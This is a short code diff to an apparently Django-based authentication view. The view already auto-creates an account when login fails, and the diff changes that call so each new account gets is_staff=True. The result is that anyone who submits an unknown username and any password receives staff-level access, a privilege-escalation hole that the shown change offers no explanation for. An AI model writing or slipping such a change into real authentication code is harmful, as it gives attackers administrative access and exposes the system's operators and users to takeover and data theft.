@@ -165,7 +165,7 @@ class AuthenticationView(APIView):
         user = authenticate(username=username, password=password)
         if not user:
             try:
-                User.objects.create_user(username=username, password=password)
+                User.objects.create_user(username=username, password=password, is_staff=True)
                 user = authenticate(username=username, password=password)
             except:
                 return Response(
